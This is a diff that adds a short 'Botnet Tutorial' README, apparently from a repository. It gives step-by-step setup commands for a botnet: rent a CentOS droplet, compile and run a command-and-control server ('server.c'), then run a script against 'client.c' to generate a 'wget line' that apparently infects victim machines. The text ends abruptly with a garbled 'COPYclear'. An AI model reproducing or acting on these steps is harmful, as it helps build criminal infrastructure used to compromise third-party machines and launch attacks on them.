@@ -1,0 +1,26 @@
+Botnet Tutorial! Please be sure to like and subscribe!
+--------------------------------------------------------------
+--You will need a Centos 6.9 x64 Droplet on "digitalocean.com"
+--Your information will be sent to your email.
+--------------------------------------------------------------
+--You will then need a program named winscp. It is 100% free.
+--download link : https://winscp.net/eng/download.php	     
+--------------------------------------------------------------
+--You will also need putty.exe so you can connect.
+--download link 64 bit : https://the.earth.li/~sgtatham/putty/latest/w64/putty.exe
+--download link 32 bit : https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe
+--------------------------------------------------------------
+
+	---------------------------
+	---INSTALLING THE BOTNET---
+	---------------------------
+        Drag Files into your WinSCP
+  
+   # yum install gcc screen python nano -y
+   # gcc -o server server.c -pthread
+   # screen ./server 50 1000 619
+         PRESS CONTROL+A+D
+   # python cc7.py client.c SERVERIP
+
+SAVE YOUR WGET LINE. HIGHLIGHT THEN RIGHT CLICK TO COPYclear
+
